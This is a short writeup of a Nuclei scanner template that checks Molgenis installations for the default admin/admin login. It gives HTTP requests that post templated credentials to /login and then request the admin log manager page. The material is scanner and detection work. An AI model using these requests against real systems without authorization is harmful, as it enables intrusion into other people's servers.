# Nuclei Template: Molgenis - Default Login
**Template ID:** molgenis-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`molgenis-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Attempts to login to Molgenis using the default credentials (admin/admin). Successful login may indicate a security risk due to unchanged default credentials.

## Steps to reproduce / Exploit Payload
```http
POST /login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

username={{username}}&password={{password}}

GET /menu/admin/logmanager HTTP/1.1
Host: {{Hostname}}
```

## References
- https://molgenis.org/
- https://github.com/molgenis/molgenis-emx2
